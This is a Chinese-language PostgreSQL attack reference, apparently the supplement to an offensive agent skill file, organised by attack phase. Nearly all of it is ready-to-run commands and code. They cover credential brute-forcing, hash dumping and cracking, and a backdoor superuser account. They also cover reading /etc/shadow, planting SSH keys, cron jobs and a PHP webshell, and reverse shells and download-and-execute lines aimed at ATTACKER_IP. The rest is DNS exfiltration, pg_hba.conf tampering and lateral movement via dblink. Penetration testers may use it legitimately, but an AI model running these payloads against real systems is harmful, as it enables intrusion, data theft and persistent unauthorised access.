# PostgreSQL 攻击技术参考

> 本文档是 SKILL.md 各 Phase 的详细命令与技术补充。

---

## 1. 认证与连接

### 利用条件
- 目标 5432 端口可达
- pg_hba.conf 配置允许远程连接
- 存在默认凭据或 trust 认证

### 连接测试

```bash
# 无密码连接（trust 认证）
psql -h TARGET -U postgres -c "SELECT version();"

# 指定密码连接
PGPASSWORD=postgres psql -h TARGET -U postgres -c "SELECT version();"

# 指定数据库连接
psql -h TARGET -U postgres -d template1 -c "SELECT 1;"

# 连接字符串格式
psql "postgresql://postgres:password@TARGET:5432/postgres"
```

### pg_hba.conf 认证模式

```
# 格式: TYPE  DATABASE  USER  ADDRESS  METHOD
# 常见配置:
local   all   all               trust        # 本地无密码
host    all   all   0.0.0.0/0   trust        # 远程无密码（极危险）
host    all   all   0.0.0.0/0   md5          # MD5 认证
host    all   all   0.0.0.0/0   scram-sha-256  # SCRAM 认证
host    all   all   127.0.0.1/32  trust      # 仅本地信任
```

### 默认用户列表

```bash
# 高优先级尝试
postgres / postgres
postgres / (空密码)
admin / admin
pgsql / pgsql

# 应用常见用户
gitlab / gitlab
sonar / sonar
confluence / confluence
jira / jira
redmine / redmine
```

### 暴力破解

```bash
# Hydra
hydra -L users.txt -P passwords.txt postgres://TARGET

# Nmap
nmap -p 5432 --script pgsql-brute --script-args userdb=users.txt,passdb=passwords.txt TARGET

# Medusa
medusa -h TARGET -U users.txt -P passwords.txt -M postgres

# Metasploit
msf> use auxiliary/scanner/postgres/postgres_login
msf> set RHOSTS TARGET
msf> set USER_FILE users.txt
msf> set PASS_FILE passwords.txt
msf> run
```

**攻击效果**: 获得 PostgreSQL 数据库连接权限，后续可进行数据枚举、文件操作或命令执行。

---

## 2. 数据库枚举

### 利用条件
- 已获得 PostgreSQL 连接权限（任意用户）

### 系统信息

```sql
-- 版本信息
SELECT version();

-- 当前用户
SELECT current_user;
SELECT session_user;

-- 当前数据库
SELECT current_database();

-- 数据目录
SHOW data_directory;

-- 配置文件路径
SHOW config_file;
SHOW hba_file;

-- 监听地址
SHOW listen_addresses;

-- 日志级别（判断是否被记录）
SHOW log_statement;
SHOW log_min_duration_statement;
```

### 数据库列表

```sql
-- 列出所有数据库
SELECT datname FROM pg_database;

-- psql 快捷命令
\l
```

### 表与 Schema 枚举

```sql
-- 所有 Schema
SELECT schema_name FROM information_schema.schemata;

-- 所有表（指定 Schema）
SELECT tablename FROM pg_tables WHERE schemaname = 'public';

-- 所有表（全部 Schema）
SELECT schemaname, tablename FROM pg_tables WHERE schemaname NOT IN ('pg_catalog', 'information_schema');

-- 表结构
SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'users';

-- psql 快捷命令
\dt          -- 当前 Schema 的表
\dt *.*      -- 所有 Schema 的表
\d tablename -- 表结构
\dn          -- 所有 Schema
```

### 敏感数据搜索

```sql
-- 搜索含密码的表
SELECT tablename FROM pg_tables WHERE tablename LIKE '%password%' OR tablename LIKE '%credential%' OR tablename LIKE '%secret%';

-- 搜索含密码的列
SELECT table_schema, table_name, column_name FROM information_schema.columns
WHERE column_name LIKE '%password%' OR column_name LIKE '%passwd%' OR column_name LIKE '%secret%' OR column_name LIKE '%token%' OR column_name LIKE '%key%';

-- 搜索用户表
SELECT table_schema, table_name, column_name FROM information_schema.columns
WHERE column_name LIKE '%user%' OR column_name LIKE '%email%' OR column_name LIKE '%login%';
```

### 角色与权限枚举

```sql
-- 所有角色及权限
SELECT rolname, rolsuper, rolcreaterole, rolcreatedb, rolcanlogin, rolreplication FROM pg_roles;

-- 角色成员关系
SELECT r.rolname AS role, m.rolname AS member
FROM pg_auth_members am
JOIN pg_roles r ON am.roleid = r.oid
JOIN pg_roles m ON am.member = m.oid;

-- 特权组成员（PG >= 11）
-- pg_read_server_files: 可读任意文件
-- pg_write_server_files: 可写任意文件
-- pg_execute_server_program: 可执行系统命令
SELECT r.rolname, m.rolname AS member_of
FROM pg_auth_members am
JOIN pg_roles r ON am.roleid = r.oid
JOIN pg_roles m ON am.member = m.oid
WHERE r.rolname IN ('pg_read_server_files', 'pg_write_server_files', 'pg_execute_server_program');

-- psql 快捷命令
\du   -- 列出所有角色
```

### 已安装扩展

```sql
-- 已安装扩展
SELECT extname, extversion FROM pg_extension;

-- 可用扩展（未安装但可安装）
SELECT name, default_version FROM pg_available_extensions WHERE installed_version IS NULL;

-- 可用语言
SELECT lanname, lanispl FROM pg_language;
```

**攻击效果**: 全面了解数据库结构、用户权限和可用攻击面，为后续利用提供信息支撑。

---

## 3. 凭据提取

### 利用条件
- 已连接 PostgreSQL
- 查询 pg_authid 需要 SUPERUSER 权限
- 查询 pg_shadow 需要 SUPERUSER 权限

### pg_authid 哈希提取

```sql
-- 提取所有用户密码哈希（SUPERUSER）
SELECT rolname, rolpassword FROM pg_authid;

-- 仅提取可登录用户
SELECT rolname, rolpassword FROM pg_authid WHERE rolcanlogin = true;

-- pg_shadow 视图（旧版兼容）
SELECT usename, passwd FROM pg_shadow;
```

### 哈希格式说明

```
# MD5 格式（PostgreSQL < 10 默认）
md5<32位hex值>
实际计算: MD5(password + username)
示例: md5d7d880f96057db31e6b842b85738efef

# SCRAM-SHA-256 格式（PostgreSQL >= 10 默认）
SCRAM-SHA-256$<iterations>:<base64_salt>$<base64_stored_key>:<base64_server_key>
示例: SCRAM-SHA-256$4096:salt$stored_key:server_key
```

### 哈希破解

```bash
# MD5 哈希（hashcat 模式 12）
# 需要知道用户名，因为 hash = MD5(password + username)
hashcat -m 12 -a 0 hash.txt wordlist.txt

# 用 john 破解
john --format=dynamic_1034 hash.txt --wordlist=wordlist.txt

# 手动验证（Python）
# import hashlib
# hashlib.md5(b"passwordusername").hexdigest()
```

### 创建后门用户

```sql
-- 创建 SUPERUSER 后门账户
CREATE ROLE backdoor WITH SUPERUSER LOGIN PASSWORD 'P@ssw0rd';

-- 创建普通用户
CREATE ROLE recon WITH LOGIN PASSWORD 'recon123';
GRANT SELECT ON ALL TABLES IN SCHEMA public TO recon;

-- 修改现有用户密码
ALTER USER postgres WITH PASSWORD 'newpass';
```

**攻击效果**: 获取数据库用户密码哈希，可离线破解后用于横向移动或权限提升。

---

## 4. 文件读写

### 利用条件
- pg_read_file: 需要 SUPERUSER 或 pg_read_server_files 组
- COPY FROM/TO: SUPERUSER 或 pg_read_server_files / pg_write_server_files 组
- Large Object: 需要数据库连接权限，lo_import/lo_export 需要 SUPERUSER

### pg_read_file 读取文件

```sql
-- 读取文本文件
SELECT pg_read_file('/etc/passwd');

-- 读取 PostgreSQL 配置
SELECT pg_read_file('/var/lib/postgresql/data/postgresql.conf');
SELECT pg_read_file('/var/lib/postgresql/data/pg_hba.conf');

-- 读取指定偏移和长度
SELECT pg_read_file('/etc/passwd', 0, 1000);

-- pg_read_binary_file（二进制文件，base64 编码输出）
SELECT encode(pg_read_binary_file('/etc/shadow'), 'base64');

-- 列出目录内容
SELECT pg_ls_dir('/etc/');
SELECT pg_ls_dir('/var/lib/postgresql/data/');

-- 获取文件大小和修改时间
SELECT * FROM pg_stat_file('/etc/passwd');
```

### COPY FROM 读文件到表

```sql
-- 创建临时表并读取文件
CREATE TEMP TABLE tmp_file(content text);
COPY tmp_file FROM '/etc/passwd';
SELECT * FROM tmp_file;
DROP TABLE tmp_file;

-- 一行式（psql）
psql -h TARGET -U postgres -c "CREATE TEMP TABLE t(c text); COPY t FROM '/etc/passwd'; SELECT * FROM t;"
```

### COPY TO 写文件

```sql
-- 写入文本到文件
COPY (SELECT 'malicious content') TO '/tmp/output.txt';

-- 写入查询结果到 CSV
COPY (SELECT * FROM pg_authid) TO '/tmp/hashes.csv' WITH CSV HEADER;

-- 写 SSH authorized_keys
COPY (SELECT 'ssh-rsa AAAA... attacker@host') TO '/var/lib/postgresql/.ssh/authorized_keys';

-- 写 cron 任务（PostgreSQL 以 postgres 用户运行）
COPY (SELECT '* * * * * /bin/bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"') TO '/var/spool/cron/crontabs/postgres';
```

### Large Object (lo) 文件读写

```sql
-- 导入文件为 Large Object（返回 OID）
SELECT lo_import('/etc/passwd');
-- 返回: 12345

-- 读取 Large Object 内容
SELECT convert_from(lo_get(12345), 'UTF8');

-- 按页读取（大文件）
SELECT convert_from(loread(lo_open(12345, x'40000'::int), 1024), 'UTF8');

-- 从数据创建 Large Object 并导出到文件
SELECT lo_from_bytea(0, decode('base64编码内容', 'base64'));
-- 返回新 OID
SELECT lo_export(NEW_OID, '/tmp/payload.bin');

-- 导出到目标路径
SELECT lo_export(12345, '/tmp/exfiltrated.txt');

-- 清理 Large Object
SELECT lo_unlink(12345);

-- 列出所有 Large Object
SELECT DISTINCT loid FROM pg_largeobject;
```

### 关键判断

- pg_read_file 返回 `ERROR: permission denied` -> 非 SUPERUSER 且不在 pg_read_server_files 组
- COPY FROM 返回 `ERROR: must be superuser` -> 需要提权
- lo_import 返回 OID -> 文件已导入，可用 lo_get 读取或 lo_export 导出

---

## 5. 命令执行

### 利用条件
- COPY TO PROGRAM: 需要 SUPERUSER 或 pg_execute_server_program 组，PostgreSQL >= 9.3
- plpython3u/plperlu: 需要 SUPERUSER 创建语言，需系统安装对应解释器
- CREATE LANGUAGE: 需要 SUPERUSER

### COPY TO PROGRAM

```sql
-- 基础命令执行
COPY (SELECT '') TO PROGRAM 'id';

-- 带输出的命令执行（写到文件后读取）
COPY (SELECT '') TO PROGRAM 'id > /tmp/cmd_output.txt';
CREATE TEMP TABLE cmd_result(output text);
COPY cmd_result FROM '/tmp/cmd_output.txt';
SELECT * FROM cmd_result;

-- 反弹 Shell
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"';

-- 下载并执行
COPY (SELECT '') TO PROGRAM 'curl http://ATTACKER_IP/payload.sh | bash';

-- wget 下载
COPY (SELECT '') TO PROGRAM 'wget -O /tmp/payload http://ATTACKER_IP/payload && chmod +x /tmp/payload && /tmp/payload';

-- 写 webshell
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO PROGRAM 'tee /var/www/html/shell.php';

-- DNS 外带数据
COPY (SELECT '') TO PROGRAM 'nslookup $(whoami).ATTACKER_DOMAIN';
```

### plpython3u UDF 命令执行

```sql
-- 安装 plpython3u 语言（需 SUPERUSER）
CREATE LANGUAGE plpython3u;

-- 创建命令执行函数
CREATE OR REPLACE FUNCTION cmd_exec(cmd text) RETURNS text AS $$
import subprocess
return subprocess.check_output(cmd, shell=True).decode()
$$ LANGUAGE plpython3u;

-- 执行命令
SELECT cmd_exec('id');
SELECT cmd_exec('cat /etc/passwd');
SELECT cmd_exec('ls -la /');
SELECT cmd_exec('whoami');

-- 反弹 Shell 函数
CREATE OR REPLACE FUNCTION rev_shell(host text, port int) RETURNS void AS $$
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/bash", "-i"])
$$ LANGUAGE plpython3u;

SELECT rev_shell('ATTACKER_IP', 4444);

-- 文件操作函数
CREATE OR REPLACE FUNCTION read_file(path text) RETURNS text AS $$
with open(path, 'r') as f:
    return f.read()
$$ LANGUAGE plpython3u;

SELECT read_file('/etc/shadow');
```

### plperlu UDF 命令执行

```sql
-- 安装 plperlu 语言
CREATE LANGUAGE plperlu;

-- 创建命令执行函数
CREATE OR REPLACE FUNCTION cmd_exec(cmd text) RETURNS text AS $$
  my $output = qx($_[0]);
  return $output;
$$ LANGUAGE plperlu;

SELECT cmd_exec('id');

-- 反弹 Shell
CREATE OR REPLACE FUNCTION rev_shell() RETURNS void AS $$
use Socket;
my $i = "ATTACKER_IP";
my $p = 4444;
socket(S, PF_INET, SOCK_STREAM, getprotobyname("tcp"));
connect(S, sockaddr_in($p, inet_aton($i)));
open(STDIN, ">&S"); open(STDOUT, ">&S"); open(STDERR, ">&S");
exec("/bin/bash -i");
$$ LANGUAGE plperlu;

SELECT rev_shell();
```

**攻击效果**: 获得 PostgreSQL 进程权限（通常为 postgres 用户）的操作系统命令执行能力。

---

## 6. 权限提升

### 利用条件
- 已连接 PostgreSQL，当前非 SUPERUSER
- 具有 CREATEROLE 权限，或可利用特权组

### CREATEROLE 提权路径

```sql
-- 检查当前权限
SELECT rolname, rolsuper, rolcreaterole FROM pg_roles WHERE rolname = current_user;

-- 如果有 CREATEROLE，可以授予自己特权组权限
GRANT pg_execute_server_program TO current_user;  -- 执行系统命令
GRANT pg_read_server_files TO current_user;       -- 读取任意文件
GRANT pg_write_server_files TO current_user;      -- 写入任意文件

-- 验证权限
SELECT * FROM pg_auth_members WHERE member = (SELECT oid FROM pg_roles WHERE rolname = current_user);
```

### ALTER ROLE 提权

```sql
-- 直接提升为 SUPERUSER（需要已有 SUPERUSER 权限或特定漏洞）
ALTER ROLE current_user WITH SUPERUSER;

-- 授予其他角色
GRANT postgres TO attacker;
```

### pg_hba.conf 篡改提权

```sql
-- 如果可以写文件（通过 COPY TO 或 lo_export）
-- 步骤 1: 读取当前 pg_hba.conf
SELECT pg_read_file('/var/lib/postgresql/data/pg_hba.conf');

-- 步骤 2: 写入 trust 认证规则
COPY (SELECT 'local all all trust') TO '/var/lib/postgresql/data/pg_hba.conf';

-- 步骤 3: 重载配置
SELECT pg_reload_conf();

-- 步骤 4: 以 postgres SUPERUSER 重新连接
psql -h TARGET -U postgres -c "SELECT current_user, rolsuper FROM pg_roles WHERE rolname = current_user;"
```

### CVE 相关提权

```sql
-- CVE-2019-9193: COPY TO PROGRAM 被错误地允许非 SUPERUSER 执行
-- 影响版本: PostgreSQL 9.3 - 11.2
COPY (SELECT '') TO PROGRAM 'id';

-- CVE-2023-2454: CREATE SCHEMA 权限绕过
-- CVE-2023-2455: 安全策略绕过
-- 需根据具体版本查看利用方式
```

**关键判断**: CREATEROLE -> pg_execute_server_program 是最常见的非 SUPERUSER 提权路径。

---

## 7. dblink 横向移动

### 利用条件
- dblink 扩展已安装或当前用户可安装扩展
- 目标内网存在其他 PostgreSQL 实例
- 或利用 dblink 本地连接绕过认证

### 安装与基础用法

```sql
-- 安装 dblink 扩展
CREATE EXTENSION IF NOT EXISTS dblink;

-- 测试连接
SELECT dblink_connect('conn1', 'host=INTERNAL_HOST port=5432 user=postgres password=postgres dbname=postgres');

-- 执行远程查询
SELECT * FROM dblink('conn1', 'SELECT usename, passwd FROM pg_shadow') AS t(usename text, passwd text);

-- 执行远程命令（需远程 SUPERUSER）
SELECT dblink_exec('conn1', $$COPY (SELECT '') TO PROGRAM 'id'$$);

-- 断开连接
SELECT dblink_disconnect('conn1');
```

### 本地连接提权

```sql
-- 利用本地 trust 认证绕过密码验证
-- 如果 pg_hba.conf 中 local 连接为 trust
SELECT dblink_connect('local_conn', 'host=/var/run/postgresql user=postgres dbname=postgres');

-- 通过本地连接执行 SUPERUSER 操作
SELECT * FROM dblink('local_conn', 'SELECT rolname, rolpassword FROM pg_authid') AS t(rolname text, rolpassword text);
SELECT dblink_exec('local_conn', $$ALTER ROLE current_user WITH SUPERUSER$$);
```

### 内网扫描

```sql
-- 通过连接错误信息判断内网主机是否存活
SELECT dblink_connect('host=192.168.1.1 port=5432 user=test password=test dbname=postgres connect_timeout=3');
-- 连接超时 -> 主机不存在或端口未开放
-- 认证失败 -> 主机存活且 PostgreSQL 运行中
-- 连接成功 -> 可进一步利用

-- 批量探测（需循环或外部脚本辅助）
SELECT dblink_connect('host=192.168.1.' || generate_series(1,254) || ' port=5432 user=test password=test connect_timeout=1');
```

**攻击效果**: 通过已控 PostgreSQL 实例横向移动到内网其他数据库，或利用本地 trust 认证绕过提权。

---

## 8. 扩展利用

### 利用条件
- 可安装扩展（需 SUPERUSER 或足够权限）
- 或目标已安装可利用的扩展

### file_fdw 文件读取

```sql
-- 安装 file_fdw 扩展
CREATE EXTENSION IF NOT EXISTS file_fdw;

-- 创建外部服务器
CREATE SERVER file_server FOREIGN DATA WRAPPER file_fdw;

-- 创建外部表映射到文件
CREATE FOREIGN TABLE etc_passwd (line text) SERVER file_server OPTIONS (filename '/etc/passwd');
SELECT * FROM etc_passwd;

-- 读取 PostgreSQL 配置
CREATE FOREIGN TABLE pg_conf (line text) SERVER file_server OPTIONS (filename '/var/lib/postgresql/data/postgresql.conf');
SELECT * FROM pg_conf;

-- 读取 pg_hba.conf
CREATE FOREIGN TABLE pg_hba (line text) SERVER file_server OPTIONS (filename '/var/lib/postgresql/data/pg_hba.conf');
SELECT * FROM pg_hba;

-- 读取 /etc/shadow
CREATE FOREIGN TABLE etc_shadow (line text) SERVER file_server OPTIONS (filename '/etc/shadow');
SELECT * FROM etc_shadow;

-- 清理
DROP FOREIGN TABLE etc_passwd;
DROP FOREIGN TABLE pg_conf;
DROP SERVER file_server;
DROP EXTENSION file_fdw;
```

### plpython3u 利用（完整）

```sql
-- 检查是否已安装
SELECT * FROM pg_language WHERE lanname = 'plpython3u';

-- 安装
CREATE LANGUAGE plpython3u;

-- 文件读取
CREATE OR REPLACE FUNCTION py_read(path text) RETURNS text AS $$
with open(path) as f: return f.read()
$$ LANGUAGE plpython3u;

-- 文件写入
CREATE OR REPLACE FUNCTION py_write(path text, content text) RETURNS void AS $$
with open(path, 'w') as f: f.write(content)
$$ LANGUAGE plpython3u;

-- HTTP 请求（外带数据）
CREATE OR REPLACE FUNCTION py_http(url text) RETURNS text AS $$
import urllib.request
return urllib.request.urlopen(url).read().decode()
$$ LANGUAGE plpython3u;

-- 网络扫描
CREATE OR REPLACE FUNCTION py_portscan(host text, port int) RETURNS boolean AS $$
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(2)
try:
    s.connect((host, port))
    s.close()
    return True
except:
    return False
$$ LANGUAGE plpython3u;

SELECT py_portscan('192.168.1.1', 22);
```

### adminpack 扩展

```sql
-- 安装 adminpack（通常用于 pgAdmin 管理）
CREATE EXTENSION adminpack;

-- 读取文件
SELECT pg_read_file('/etc/passwd');

-- 写入文件
SELECT pg_file_write('/tmp/test.txt', 'content', false);

-- 重命名文件
SELECT pg_file_rename('/tmp/old.txt', '/tmp/new.txt');

-- 删除文件
SELECT pg_file_unlink('/tmp/test.txt');
```

### postgres_fdw 跨库查询

```sql
-- 安装
CREATE EXTENSION postgres_fdw;

-- 创建外部服务器
CREATE SERVER remote_pg FOREIGN DATA WRAPPER postgres_fdw OPTIONS (host 'INTERNAL_HOST', port '5432', dbname 'postgres');

-- 创建用户映射
CREATE USER MAPPING FOR current_user SERVER remote_pg OPTIONS (user 'postgres', password 'postgres');

-- 创建外部表
CREATE FOREIGN TABLE remote_users (usename text, passwd text) SERVER remote_pg OPTIONS (schema_name 'pg_catalog', table_name 'pg_shadow');

-- 查询远程数据
SELECT * FROM remote_users;
```

**攻击效果**: 通过扩展机制实现文件读取、代码执行和跨库/跨主机数据访问。

---

## 工具清单

| 工具 | 地址 | 用途 |
|------|------|------|
| psql | PostgreSQL 官方自带 | 标准客户端，所有操作基础 |
| pgcli | https://www.pgcli.com/ | 带语法高亮和自动补全的客户端 |
| pg_dump / pg_dumpall | PostgreSQL 官方自带 | 数据库导出 |
| sqlmap | https://sqlmap.org/ | SQL 注入自动化 |
| Metasploit postgres modules | 内置 | 登录爆破、枚举、RCE |
| hydra / medusa | 各自官方仓库 | PostgreSQL 密码爆破 |
| hashcat / john | 各自官方仓库 | pg_authid 哈希离线破解 |
